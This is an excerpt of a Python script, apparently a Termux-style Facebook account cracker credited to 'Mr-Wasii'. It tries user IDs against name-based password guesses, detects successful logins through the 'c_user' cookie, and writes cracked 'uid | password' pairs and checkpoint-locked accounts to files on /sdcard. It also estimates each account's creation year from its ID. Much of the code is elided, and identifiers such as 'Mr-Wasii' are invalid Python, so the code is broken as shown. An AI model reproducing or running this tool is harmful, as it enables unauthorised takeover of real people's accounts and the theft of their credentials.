#created by Wasim Mailk

#team name The Beast

#tottaly written by Mr-Wasii 
...
def Jawnx(uid):
    ...
    if len(uid)==15:
        ...
        if uid[:10] in ['1000000000']       :Mr-Wasii  = ' 2009'

        elif uid[:9] in ['100000000']       :Mr-Wasii  = '~> 2009'

        elif uid[:8] in ['10000000']        :Mr-Wasii  = '~> 2009'

        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:Mr-Wasii  = '~> 2009'

        elif uid[:7] in ['1000006','1000007','1000008','1000009']:Mr-Wasii  = ' 2010'

        elif uid[:6] in ['100001']          :Mr-Wasii  = '~> 2010/2011'

        elif uid[:6] in ['100002','100003'] :Mr-Wasii  = '~> 2011/2012'

        elif uid[:6] in ['100004']          :Mr-Wasii  = '~> 2012/2013'

        elif uid[:6] in ['100005','100006'] :Mr-Wasii  = '~> 2013/2014'

        elif uid[:6] in ['100007','100008'] :Mr-Wasii  = '~> 2014/2015'

        elif uid[:6] in ['100009']          :Mr-Wasii  = '~> 2015'

        elif uid[:5] in ['10001']           :Mr-Wasii  = '~> 2015/2016'

        elif uid[:5] in ['10002']           :Mr-Wasii  = '~> 2016/2017'

        elif uid[:5] in ['10003']           :Mr-Wasii  = '~> 2018/2019'

        elif uid[:5] in ['10004']           :Mr-Wasii  = '~> 2019/2020'

        elif uid[:5] in ['10005']           :Mr-Wasii  = '~> 2020'

        elif uid[:5] in ['10006','10007','']:Mr-Wasii  = '~> 2021'

        elif uid[:5] in ['10008']           :Mr-Wasii  = '~> 2022'
...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mMr-Wasii        \033[1;31m│

\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mA Wasim Malik      \033[1;31m│

\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m Mr-Wasii           \033[1;31m │

\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mShaheen Tech              \033[1;31m   │

\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m1.4                    \033[1;31m   │

\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mSajjan Writes\033[1;37m {\033[1;36mHBF\033[1;37m} \033[1;31m│
...
print(f"{BLUE} PUT YOUR NAME LIKE Wasim, Siraj, Minsa, Ayesha ")
...
def XYZ():
    ...
    print(f"\t      {WHITE}[{EXTRA} {Mr-WasiiT()} {WHITE}]")
...
def pass1():
    ...
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Mr-Wasii-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
...
def freeq(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',}
            ...
            if 'c_user' in log_cookies:
                ...
                #os.system("play-audio Mr-Wasii_OK.mp3")

                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')

                cek_apk(session,coki)

                open('/sdcard/Mr-Wasii-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    #os.system("play-audio Mr-Wasii_2F.mp3")
                  ...
                  #  os.system("play-audio Mr-Wasii_CP.mp3")

                    print(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')

                    open('/sdcard/Mr-Wasii-CP.txt', 'a').write(uid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[Mr-Wasii 🔥💪🔥🔥] [%s] \33[1;97m[OK:%s{Mr-Wasii 2}CP:%s]'%(loop,len(ok),len(cp))), 
